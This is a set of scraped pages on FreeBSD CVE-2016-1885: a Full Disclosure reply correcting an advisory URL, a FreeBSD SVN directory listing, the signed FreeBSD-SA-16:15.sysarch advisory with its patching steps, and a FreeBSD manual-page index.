=== Content from seclists.org_4bbb1bb1_20250125_053245.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](66)
[By Date](date.html#67)
[![Next](/images/right-icon-16x16.png)](68)

[![Previous](/images/left-icon-16x16.png)](56)
[By Thread](index.html#67)
[![Next](/images/right-icon-16x16.png)](57)

![](/shared/images/nst-icons.svg#search)

# Re: [CORE-2016-0005] - FreeBSD Kernel amd64\_set\_ldt Heap Overflow

---

*From*: jungle Boogie <jungleboogie0 () gmail com>

*Date*: Wed, 16 Mar 2016 12:04:21 -0700

---

```
On 16 March 2016 at 10:30, CORE Advisories Team
<advisories () coresecurity com> wrote:

```
> ```
> Title: FreeBSD Kernel amd64_set_ldt Heap Overflow
> Advisory ID: CORE-2016-0005
> Advisory URL: <http://www.coresecurity.com/content/freebsd-kernel-amd64_set_ldt-heap-overflow>
> Date published: 2016-03-16
> Date of last update: 2016-03-14
> Vendors contacted: FreeBSD
> Release mode: Coordinated release
>
> ```

```

Your URL is wrong.

Correct location:
<http://www.coresecurity.com/advisories/freebsd-kernel-amd64setldt-heap-overflow>

--
-------
inum: 883510009027723
sip: jungleboogie () sip2sip info
xmpp: jungle-boogie () jit si

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](66)
[By Date](date.html#67)
[![Next](/images/right-icon-16x16.png)](68)

[![Previous](/images/left-icon-16x16.png)](56)
[By Thread](index.html#67)
[![Next](/images/right-icon-16x16.png)](57)

### Current thread:

* [[CORE-2016-0005] - FreeBSD Kernel amd64\_set\_ldt Heap Overflow](56) *CORE Advisories Team (Mar 16)*
  + **Re: [CORE-2016-0005] - FreeBSD Kernel amd64\_set\_ldt Heap Overflow** *jungle Boogie (Mar 17)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from svnweb.freebsd.org_2a1f83d1_20250126_062253.html ===


| **</>[base]** |  |
| --- | --- |

![ViewVC logotype](/*docroot*/images/viewvc-logo.png)
# Index of /

| Files shown: | **1** |
| --- | --- |
| Directory revision: | [373332](/base?view=revision&revision=373332 "Revision 373332") (of [373332](/base?view=revision "Revision 373332")) |
| Sticky Revision: |  |

---

| [File](/base/?sortdir=down#dirlist) | | [Rev.](/base/?sortby=rev#dirlist) | [Age](/base/?sortby=date#dirlist) | [Author](/base/?sortby=author#dirlist) | [Last log entry](/base/?sortby=log#dirlist) |
| --- | --- | --- | --- | --- | --- |
| [head/](/base/head/ "View directory contents") | | [**368820**](/base/head/?view=log "View directory revision log") | 4 years | lwhsu | Mark the repository as being converted to Git. This is the last Subversion comm… |
| [projects/](/base/projects/ "View directory contents") | | [**368654**](/base/projects/?view=log "View directory revision log") | 4 years | asomers | aio.4: Link to aio\_writev.2 and aio\_readv.2 Also, add links to aio\_error.2 and … |
| [release/](/base/release/ "View directory contents") | | [**367086**](/base/release/?view=log "View directory revision log") | 4 years | gjb | Tag releng/12.2@[r366954](/base?view=revision&revision=366954) as release/12.2.0 (12.2-RELEASE). Approved by: re (impl… |
| [releng/](/base/releng/ "View directory contents") | | [**373288**](/base/releng/?view=log "View directory revision log") | 13 months | markj | Add UPDATING entries and bump version Approved by: so Git Hash: b5ad6b488d9e… |
| [stable/](/base/stable/ "View directory contents") | | [**373332**](/base/stable/?view=log "View directory revision log") | 5 weeks | jrtc27 | mips: Extract HWREna configuration and call from APs The intent of mips\_get\_ide… |
| [svnadmin/](/base/svnadmin/ "View directory contents") | | [**368694**](/base/svnadmin/?view=log "View directory revision log") | 4 years | lwhsu | Mark creating new branch under user and projects needs to inform git-admin first… |
| [user/](/base/user/ "View directory contents") | | [**368655**](/base/user/?view=log "View directory revision log") | 4 years | pho | Added more swapoff test scenarios. |
| [vendor/](/base/vendor/ "View directory contents") | | [**368746**](/base/vendor/?view=log "View directory revision log") | 4 years | delphij | Apply upstream fix 08968baec1122a58bb90d8f97ad948a75f8a5d69: Fix error cases wh… |
| [vendor-crypto/](/base/vendor-crypto/ "View directory contents") | | [**368475**](/base/vendor-crypto/?view=log "View directory revision log") | 4 years | jkim | Update OpenSSL upgrade procedure for the new assembly file path. |
| [vendor-sys/](/base/vendor-sys/ "View directory contents") | | [**367798**](/base/vendor-sys/?view=log "View directory revision log") | 4 years | mw | Upgrade ENA HAL to v2.3.0 Sponsored by: Amazon, Inc. |
| [ROADMAP.txt](/base/ROADMAP.txt?view=log "View file revision log") | | [**285589**](/base/ROADMAP.txt?revision=285589&view=markup "View file contents") | 9 years | delphij | Chase svn -> repo change. |

---

## Properties

| Name | Value |
| --- | --- |
| **svn:auto-props** | \*.c = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.h = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.s = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.S = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.cc = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.cpp = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.cxx = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.in = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.sh = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain; svn:executable \*.pl = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain; svn:executable \*.pm = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.py = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.rb = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.awk = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.sed = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.txt = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.conf = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.mk = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.inc = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.d = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.lua = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.po = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain Makefile\* = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.1 = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.2 = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.3 = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.3lua = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.4 = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.5 = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.6 = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.7 = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.8 = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.9 = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain WITH\* = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.css = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/css \*.html = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/html \*.xhtml = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/html+xml \*.xml = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/xml \*.xsd = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/xml \*.xsl = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/xml \*.xslt = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/xml \*.xul = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/xul \*.sgml = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/sgml \*.docbook = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/sgml \*.dts = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.dtsi = svn:eol-style=native; svn:keywords=FreeBSD=%H; svn:mime-type=text/plain \*.pdf = svn:mime-type=application/pdf \*.ps = svn:mime-type=application/postscript \*.eps = svn:mime-type=application/postscript \*.exe = svn:mime-type=application/octet-stream \*.bin = svn:mime-type=application/octet-stream \*.core = epic=fail \*.o = epic=fail \*.a = epic=fail \*.so = epic=fail \*.jpg = svn:mime-type=image/jpeg \*.jpeg = svn:mime-type=image/jpeg \*.gif = svn:mime-type=image/gif \*.png = svn:mime-type=image/png \*.tiff = svn:mime-type=image/tiff \*.pem = svn:eol-style=native; fbsd:nokeywords=yes; svn:mime-type=text/plain |

---

|  | **[ViewVC Help](/%2Adocroot%2A/help_rootview.html)** |
| --- | --- |
| Powered by [ViewVC 1.1.27](http://viewvc.org/) |  |



=== Content from security.FreeBSD.org_0cf047a9_20250125_053247.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
=============================================================================
FreeBSD-SA-16:15.sysarch [REVISED] Security Advisory
The FreeBSD Project
Topic: Incorrect argument validation in sysarch(2)
Category: core
Module: kernel
Announced: 2016-10-25
Credits: Core Security, ahaha from Chaitin Tech
Affects: All supported versions of FreeBSD.
Corrected: 2016-10-25 17:14:50 UTC (stable/11, 11.0-STABLE)
2016-10-25 17:11:20 UTC (releng/11.0, 11.0-RELEASE-p2)
2016-10-25 17:16:08 UTC (stable/10, 10.3-STABLE)
2016-10-25 17:11:15 UTC (releng/10.3, 10.3-RELEASE-p11)
2016-10-25 17:11:11 UTC (releng/10.2, 10.2-RELEASE-p24)
2016-10-25 17:11:07 UTC (releng/10.1, 10.1-RELEASE-p41)
2016-10-25 17:16:58 UTC (stable/9, 9.3-STABLE)
2016-10-25 17:11:02 UTC (releng/9.3, 9.3-RELEASE-p49)
CVE Name: CVE-2016-1885
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
0. Revision history
v1.0 2016-03-16 Initial release.
v1.1 2016-10-25 Revised patch to address a problem pointed out by
ahaha from Chaitin Tech.
I. Background
The IA-32 architecture allows programs to define segments, which provides
based and size-limited view into the program address space. The
memory-resident processor structure, called Local Descriptor Table,
usually abbreviated LDT, contains definitions of the segments. Since
incorrect or malicious segments would breach system integrity, operating
systems do not provide processes direct access to the LDT, instead
they provide system calls which allow controlled installation and removal
of segments.
II. Problem Description
A special combination of sysarch(2) arguments, specify a request to
uninstall a set of descriptors from the LDT. The start descriptor
is cleared and the number of descriptors are provided. Due to lack
of sufficient bounds checking during argument validity verification,
unbound zero'ing of the process LDT and adjacent memory can be initiated
from usermode.
III. Impact
This vulnerability could cause the kernel to panic. In addition it is
possible to perform a local Denial of Service against the system by
unprivileged processes.
IV. Workaround
No workaround is available, but only the amd64 architecture is affected.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to a supported FreeBSD stable or
release / security branch (releng) dated after the correction date.
Reboot is required.
2) To update your vulnerable system via a binary patch:
Systems running a RELEASE version of FreeBSD platforms can be updated
via the freebsd-update(8) utility:
# freebsd-update fetch
# freebsd-update install
Reboot is required.
3) To update your vulnerable system via a source code patch:
The following patches have been verified to apply to the applicable
FreeBSD release branches.
[\*\*\* v1.1 NOTE \*\*\*] If your sources are not yet patched using the initially
published advisory patches, then you need to apply both sysarch.patch and
sysarch-01.patch. If your sources are already updated, or patched with
patches from the initial advisory, then you need to apply sysarch-01.patch
only.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
[ FreeBSD system not patched with original SA-16:15 patch]
# fetch https://security.FreeBSD.org/patches/SA-16:15/sysarch.patch
# fetch https://security.FreeBSD.org/patches/SA-16:15/sysarch.patch.asc
# gpg --verify sysarch.patch.asc
[ FreeBSD system that has been patched with original SA-16:15 patch]
# fetch https://security.FreeBSD.org/patches/SA-16:15/sysarch-01.patch
# fetch https://security.FreeBSD.org/patches/SA-16:15/sysarch-01.patch.asc
# gpg --verify sysarch-01.patch.asc
b) Apply the patch(es). Execute the following commands as root for
every patch file downloaded:
# cd /usr/src
# patch < /path/to/patch
c) Recompile your kernel as described in
 and reboot the
system.
VI. Correction details
The following list contains the correction revision numbers for each
affected branch.
Branch/path Revision
- -------------------------------------------------------------------------
stable/9/ r307941
releng/9.3/ r307931
stable/10/ r307940
releng/10.1/ r307932
releng/10.2/ r307933
releng/10.3/ r307934
stable/11/ r307938
releng/11.0/ r307935
- -------------------------------------------------------------------------
To see which files were modified by a particular revision, run the
following command, replacing NNNNNN with the revision number, on a
machine with Subversion installed:
# svn diff -cNNNNNN --summarize svn://svn.freebsd.org/base
Or visit the following URL, replacing NNNNNN with the revision number:
VII. References
The latest revision of this advisory is available at
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJYD5VZAAoJEO1n7NZdz2rnYT4QAMmnfUBnxiNHfzaEDMe2oU+H
WIVFzFtU5FTAm3wJ3JORU1euqhusDoB7D8nova30alM2bHHd86epBGgym1Q+hxR2
qTI+d8QimvQUWelz7DWPh0h3ZNlVfDxY8vKlr5SS0W/HOMjbG/O6U1AIw5p7cPaa
LkDpqo2IN8xBL6tJFUKNEQS/GzuU2HtfKhQK0/ojT4DW61AkOZn4SZzzYBz3iO4p
a8Otv4+aHzyNjTZRm/33SrFzdG0RZWyT/WXsEHlv5NiXVMPML+oY918jppqClkoO
pwjcneWTqgYrE4vvVOADKOlWyNa4jFmPQSW7MmNEaF4RMd8TMcE/cBTKOi41YuOp
la1JzvtWUnou7oQqy/xKr0S/Wa2x6ZhR4vBg28fkfrQhn55N+qqDicQ3F907dOm5
A0ERHKgImlWSGM+Sf2CJyrUJUNUye0bVQMhrM4e3psZ7Jr20IXjnhppr1mufCjTH
H+aEHv43o/1HuoltnjstiBZ/CZpFdIXkBpsHtzteZR2y+pmZFA9bB4uZeeML0mj3
/cxj8rgPRmcjk6nSsnLWhq2YEFAZBC/lv43wqSrXE9+BBpSh6zM5NCTPb50/dBqf
V553uuGEvJlHmOAoveXxYyxKcGpgZAcgJjWpAkCpoVxgdrbtLcPY5Z+8cy8fMO3G
YHOkZydbLPaXOXimZfut
=NWuL
-----END PGP SIGNATURE-----


=== Content from www.freebsd.org_7e55ad96_20250126_062252.html ===

[Skip site
navigation](#content "Skip site navigation") (1)[Skip section navigation](#content "Skip section navigation") (2)
## Header And Logo

[![FreeBSD](https://www.FreeBSD.org/layout/images/banner-red.png)](https://www.FreeBSD.org "FreeBSD")

## Peripheral Links

**.**

[Donate to FreeBSD](https://www.FreeBSDFoundation.org/donate/)

**.**

## Search

## Site Navigation

* [Home](https://www.FreeBSD.org/)

* [About](https://www.FreeBSD.org/about/)
  + [Introduction](https://www.FreeBSD.org/projects/newbies/)
  + [Features](https://www.FreeBSD.org/features/)
  + [Advocacy](https://www.FreeBSD.org/advocacy/)
  + [Marketing](https://www.FreeBSD.org/marketing/)

* [Get FreeBSD](https://www.FreeBSD.org/where/)
  + [Release Information](https://www.FreeBSD.org/releases/)
  + [Release Engineering](https://www.FreeBSD.org/releng/)

* [Documentation](https://www.FreeBSD.org/docs/)
  + [FAQ](https://docs.freebsd.org/en/books/faq/)
  + [Handbook](https://docs.freebsd.org/en/books/handbook/)
  + [Porter's Handbook](https://docs.freebsd.org/en/books/porters-handbook/)
  + [Developer's Handbook](https://docs.freebsd.org/en//books/developers-handbook/)
  + [Manual Pages](https://www.FreeBSD.org/cgi/man.cgi)
  + [Documentation Project Primer](https://docs.freebsd.org/en/books/fdp-primer/)
  + [All Books and Articles](https://www.FreeBSD.org/docs/books/)

* [Community](https://www.FreeBSD.org/community.html)
  + [Mailing Lists](https://www.FreeBSD.org/community/mailinglists.html)
  + [Forums](https://forums.FreeBSD.org)
  + [User Groups](https://www.FreeBSD.org/usergroups.html)
  + [Events](https://www.FreeBSD.org/events/events.html)

* [Developers](https://www.FreeBSD.org/projects/index.html)
  + [Project Ideas](https://www.FreeBSD.org/projects/ideas/ideas.html)
  + [GIT Repository](https://cgit.FreeBSD.org)

* [Support](https://www.FreeBSD.org/support.html)
  + [Vendors](https://www.FreeBSD.org/commercial/commercial.html)
  + [Security Information](https://security.FreeBSD.org/)
  + [Bug Reports](https://bugs.freebsd.org/search/)
  + [Submit Bug-report](https://www.FreeBSD.org/support.html)

* [Foundation](https://www.freebsdfoundation.org/)
  + [Donate](https://www.freebsdfoundation.org/donate/)

# FreeBSD Manual Pages

man
apropos

All Sections
1 - General Commands
2 - System Calls
3 - Subroutines
4 - Special Files
5 - File Formats
6 - Games
7 - Macros and Conventions
8 - Maintenance Commands
9 - Kernel Interface
n - New Commands

FreeBSD 15.0-CURRENT
FreeBSD 14.2-RELEASE
FreeBSD 14.2-RELEASE and Ports
FreeBSD 14.2-STABLE
FreeBSD 14.1-RELEASE
FreeBSD 14.1-RELEASE and Ports
FreeBSD 14.0-RELEASE
FreeBSD 14.0-RELEASE and Ports
FreeBSD 13.4-RELEASE
FreeBSD 13.4-RELEASE and Ports
FreeBSD 13.4-STABLE
FreeBSD 13.3-RELEASE
FreeBSD 13.3-RELEASE and Ports
FreeBSD 13.2-RELEASE
FreeBSD 13.2-RELEASE and Ports
FreeBSD 13.1-RELEASE
FreeBSD 13.1-RELEASE and Ports
FreeBSD 13.0-RELEASE
FreeBSD 13.0-RELEASE and Ports
FreeBSD 12.4-RELEASE
FreeBSD 12.4-RELEASE and Ports
FreeBSD 12.3-RELEASE
FreeBSD 12.3-RELEASE and Ports
FreeBSD 12.2-RELEASE
FreeBSD 12.2-RELEASE and Ports
FreeBSD 12.1-RELEASE
FreeBSD 12.1-RELEASE and Ports
FreeBSD 12.0-RELEASE
FreeBSD 12.0-RELEASE and Ports
FreeBSD 11.4-RELEASE
FreeBSD 11.4-RELEASE and Ports
FreeBSD 11.3-RELEASE
FreeBSD 11.3-RELEASE and Ports
FreeBSD 11.2-RELEASE
FreeBSD 11.2-RELEASE and Ports
FreeBSD 11.1-RELEASE
FreeBSD 11.1-RELEASE and Ports
FreeBSD 11.0-RELEASE
FreeBSD 11.0-RELEASE and Ports
FreeBSD 10.4-RELEASE
FreeBSD 10.4-RELEASE and Ports
FreeBSD 10.3-RELEASE
FreeBSD 10.3-RELEASE and Ports
FreeBSD 10.2-RELEASE
FreeBSD 10.2-RELEASE and Ports
FreeBSD 10.1-RELEASE
FreeBSD 10.1-RELEASE and Ports
FreeBSD 10.0-RELEASE
FreeBSD 10.0-RELEASE and Ports
FreeBSD 9.3-RELEASE
FreeBSD 9.3-RELEASE and Ports
FreeBSD 9.2-RELEASE
FreeBSD 9.2-RELEASE and Ports
FreeBSD 9.1-RELEASE
FreeBSD 9.1-RELEASE and Ports
FreeBSD 9.0-RELEASE
FreeBSD 9.0-RELEASE and Ports
FreeBSD 8.4-RELEASE
FreeBSD 8.4-RELEASE and Ports
FreeBSD 8.3-RELEASE
FreeBSD 8.3-RELEASE and Ports
FreeBSD 8.2-RELEASE
FreeBSD 8.2-RELEASE and Ports
FreeBSD 8.1-RELEASE
FreeBSD 8.1-RELEASE and Ports
FreeBSD 8.0-RELEASE
FreeBSD 8.0-RELEASE and Ports
FreeBSD 7.4-RELEASE
FreeBSD 7.4-RELEASE and Ports
FreeBSD 7.3-RELEASE
FreeBSD 7.3-RELEASE and Ports
FreeBSD 7.2-RELEASE
FreeBSD 7.2-RELEASE and Ports
FreeBSD 7.1-RELEASE
FreeBSD 7.1-RELEASE and Ports
FreeBSD 7.0-RELEASE
FreeBSD 6.4-RELEASE
FreeBSD 6.4-RELEASE and Ports
FreeBSD 6.3-RELEASE
FreeBSD 6.3-RELEASE and Ports
FreeBSD 6.2-RELEASE
FreeBSD 6.1-RELEASE
FreeBSD 6.0-RELEASE
FreeBSD 6.0-RELEASE and Ports
FreeBSD 5.5-RELEASE
FreeBSD 5.5-RELEASE and Ports
FreeBSD 5.4-RELEASE
FreeBSD 5.4-RELEASE and Ports
FreeBSD 5.3-RELEASE
FreeBSD 5.3-RELEASE and Ports
FreeBSD 5.2.1-RELEASE
FreeBSD 5.2.1-RELEASE and Ports
FreeBSD 5.2-RELEASE
FreeBSD 5.2-RELEASE and Ports
FreeBSD 5.1-RELEASE
FreeBSD 5.0-RELEASE
FreeBSD 4.11-RELEASE
FreeBSD 4.11-RELEASE and Ports
FreeBSD 4.10-RELEASE
FreeBSD 4.10-RELEASE and Ports
FreeBSD 4.9-RELEASE
FreeBSD 4.9-RELEASE and Ports
FreeBSD 4.8-RELEASE
FreeBSD 4.8-RELEASE and Ports
FreeBSD 4.7-RELEASE
FreeBSD 4.6.2-RELEASE
FreeBSD 4.6.2-RELEASE and Ports
FreeBSD 4.6-RELEASE
FreeBSD 4.6-RELEASE and Ports
FreeBSD 4.5-RELEASE
FreeBSD 4.5-RELEASE and Ports
FreeBSD 4.4-RELEASE
FreeBSD 4.3-RELEASE
FreeBSD 4.3-RELEASE and Ports
FreeBSD 4.2-RELEASE
FreeBSD 4.2-RELEASE and Ports
FreeBSD 4.1.1-RELEASE
FreeBSD 4.1.1-RELEASE and Ports
FreeBSD 4.1-RELEASE
FreeBSD 4.0-RELEASE
FreeBSD 3.5.1-RELEASE
FreeBSD 3.5.1-RELEASE and Ports
FreeBSD 3.5-RELEASE and Ports
FreeBSD 3.4-RELEASE
FreeBSD 3.4-RELEASE and Ports
FreeBSD 3.3-RELEASE
FreeBSD 3.2-RELEASE
FreeBSD 3.1-RELEASE
FreeBSD 3.0-RELEASE
FreeBSD 2.2.8-RELEASE
FreeBSD 2.2.8-RELEASE and Ports
FreeBSD 2.2.7-RELEASE
FreeBSD 2.2.6-RELEASE
FreeBSD 2.2.5-RELEASE
FreeBSD 2.2.2-RELEASE
FreeBSD 2.2.1-RELEASE
FreeBSD 2.1.7.1-RELEASE
FreeBSD 2.1.6.1-RELEASE
FreeBSD 2.1.5-RELEASE
FreeBSD 2.1.0-RELEASE
FreeBSD 2.0.5-RELEASE
FreeBSD 2.0-RELEASE
FreeBSD 1.1.5.1-RELEASE
FreeBSD 1.1-RELEASE
FreeBSD 1.0-RELEASE
FreeBSD Ports 14.2
FreeBSD Ports 14.0
FreeBSD Ports 13.4
FreeBSD Ports 13.3
FreeBSD Ports 13.2
FreeBSD Ports 13.1
FreeBSD Ports 13.0
FreeBSD Ports 12.4
FreeBSD Ports 12.3
FreeBSD Ports 12.2
FreeBSD Ports 12.1
FreeBSD Ports 12.0
FreeBSD Ports 11.4
FreeBSD Ports 11.3
FreeBSD Ports 11.2
FreeBSD Ports 11.1
FreeBSD Ports 11.0
FreeBSD Ports 10.4
FreeBSD Ports 10.3
FreeBSD Ports 10.2
FreeBSD Ports 10.1
FreeBSD Ports 10.0
FreeBSD Ports 9.3
FreeBSD Ports 9.2
FreeBSD Ports 9.1
FreeBSD Ports 9.0
FreeBSD Ports 8.4
FreeBSD Ports 8.3
FreeBSD Ports 8.2
FreeBSD Ports 8.1
FreeBSD Ports 8.0
FreeBSD Ports 7.4
FreeBSD Ports 7.3
FreeBSD Ports 7.2
FreeBSD Ports 7.1
FreeBSD Ports 7.0
FreeBSD Ports 6.4
FreeBSD Ports 6.3
FreeBSD Ports 6.2
FreeBSD Ports 6.0
FreeBSD Ports 5.5
FreeBSD Ports 5.4
FreeBSD Ports 5.3
FreeBSD Ports 5.2.1
FreeBSD Ports 5.2
FreeBSD Ports 5.1
FreeBSD Ports 4.11
FreeBSD Ports 4.10
FreeBSD Ports 4.9
FreeBSD Ports 4.8
FreeBSD Ports 4.7
FreeBSD Ports 4.6.2
FreeBSD Ports 4.6
FreeBSD Ports 4.5
FreeBSD Ports 4.3
FreeBSD Ports 4.2
FreeBSD Ports 4.1.1
FreeBSD Ports 3.5.1
FreeBSD Ports 3.5
FreeBSD Ports 3.4
FreeBSD Ports 2.2.8
4.4BSD Lite2
4.3BSD NET/2
4.3BSD Reno
2.11 BSD
2.10 BSD
2.9.1 BSD
2.8 BSD
386BSD 0.1
386BSD 0.0
CentOS 7.9
CentOS 7.8
CentOS 7.7
CentOS 7.6
CentOS 7.5
CentOS 7.4
CentOS 7.3
CentOS 7.2
CentOS 7.1
CentOS 7.0
CentOS 6.10
CentOS 6.9
CentOS 6.8
CentOS 6.7
CentOS 6.6
CentOS 6.5
CentOS 6.4
CentOS 6.3
CentOS 6.2
CentOS 6.1
CentOS 6.0
CentOS 5.11
CentOS 5.10
CentOS 5.9
CentOS 5.8
CentOS 5.7
CentOS 5.6
CentOS 5.5
CentOS 5.4
CentOS 4.8
CentOS 3.9
Darwin 8.0.1/ppc
Darwin 7.0.1
Darwin 6.0.2/x86
Darwin 1.4.1/x86
Darwin 1.3.1/x86
Debian 13.0 unstable
Debian 12.8.0
Debian 12.7.0
Debian 11.11.0
Debian 10.13.0
Debian 9.13.0
Debian 8.11.1
Debian 7.11.0
Debian 6.0.10
Debian 5.0.10
Debian 4.0.9
Debian 3.1.8
Debian 2.2.7
Debian 2.0.0
Dell UNIX SVR4 2.2
DragonFly 6.4.0
DragonFly 5.8.3
DragonFly 4.8.1
DragonFly 3.8.2
DragonFly 2.10.1
DragonFly 1.12.1
DragonFly 1.0A
HP-UX 11.22
HP-UX 11.20
HP-UX 11.11
HP-UX 11.00
HP-UX 10.20
HP-UX 10.10
HP-UX 10.01
HP-UX 9.07
HP-UX 8.07
Inferno 4th Edition
IRIX 6.5.30
Linux Slackware 3.1
MACH 2.5/i386
macOS 15.0
macOS 14.3.1
macOS 13.6.5
macOS 12.7.3
macOS 10.13.6
Minix 3.3.0
Minix 3.2.1
Minix 3.2.0
Minix 3.1.7
Minix 3.1.6
Minix 3.1.5
Minix 2.0.0
NetBSD 10.1
NetBSD 10.0
NetBSD 9.3
NetBSD 9.2
NetBSD 9.1
NetBSD 9.0
NetBSD 8.2
NetBSD 8.1
NetBSD 8.0
NetBSD 7.1
NetBSD 7.0
NetBSD 6.1.5
NetBSD 6.0
NetBSD 5.1
NetBSD 5.0
NetBSD 4.0.1
NetBSD 4.0
NetBSD 3.1
NetBSD 3.0
NetBSD 2.1
NetBSD 2.0.2
NetBSD 2.0
NetBSD 1.6.2
NetBSD 1.6.1
NetBSD 1.6
NetBSD 1.5.3
NetBSD 1.5.2
NetBSD 1.5.1
NetBSD 1.5
NetBSD 1.4.3
NetBSD 1.4.2
NetBSD 1.4.1
NetBSD 1.4
NetBSD 1.3.3
NetBSD 1.3.2
NetBSD 1.3.1
NetBSD 1.3
NetBSD 1.2.1
NetBSD 1.2
NetBSD 1.1
NetBSD 1.0
NeXTSTEP 3.3
OpenBSD 7.6
OpenBSD 7.5
OpenBSD 7.4
OpenBSD 7.3
OpenBSD 7.2
OpenBSD 7.1
OpenBSD 7.0
OpenBSD 6.9
OpenBSD 6.8
OpenBSD 6.7
OpenBSD 6.6
OpenBSD 6.5
OpenBSD 6.4
OpenBSD 6.3
OpenBSD 6.2
OpenBSD 6.1
OpenBSD 6.0
OpenBSD 5.9
OpenBSD 5.8
OpenBSD 5.7
OpenBSD 5.6
